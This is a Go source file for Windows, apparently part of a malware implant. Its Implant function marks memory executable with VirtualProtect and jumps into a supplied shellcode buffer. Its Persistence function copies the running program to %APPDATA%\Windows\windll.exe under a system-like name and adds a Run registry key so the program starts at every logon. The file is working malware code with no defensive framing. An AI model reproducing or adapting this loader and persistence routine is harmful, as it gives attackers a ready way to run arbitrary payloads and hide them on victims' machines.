package run

import (
	"os"
	"syscall"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func Implant(sc []byte) {
	exec := func() {}

	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&exec))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Error")
	}

	**(**uintptr)(unsafe.Pointer(&exec)) = *(*uintptr)(unsafe.Pointer(&sc))

	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Error")
	}

	exec()
}

var StatupInfo syscall.StartupInfo
var ProcessInfo syscall.ProcessInformation

func Persistence() {
	Args := syscall.StringToUTF16Ptr("c:\\windows\\system32\\cmd.exe /c mkdir %APPDATA%\\Windows")
	syscall.CreateProcess(nil, Args, nil, nil, true, 0, nil, nil, &StatupInfo, &ProcessInfo)

	CopyString := string("c:\\windows\\system32\\cmd.exe /c copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe")

	Args = syscall.StringToUTF16Ptr(CopyString)
	syscall.CreateProcess(nil, Args, nil, nil, true, 0, nil, nil, &StatupInfo, &ProcessInfo)

	Args = syscall.StringToUTF16Ptr("c:\\windows\\system32\\cmd.exe /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V WinDll /t REG_SZ /F /D %APPDATA%\\Windows\\windll.exe")
	syscall.CreateProcess(nil, Args, nil, nil, true, 0, nil, nil, &StatupInfo, &ProcessInfo)

}
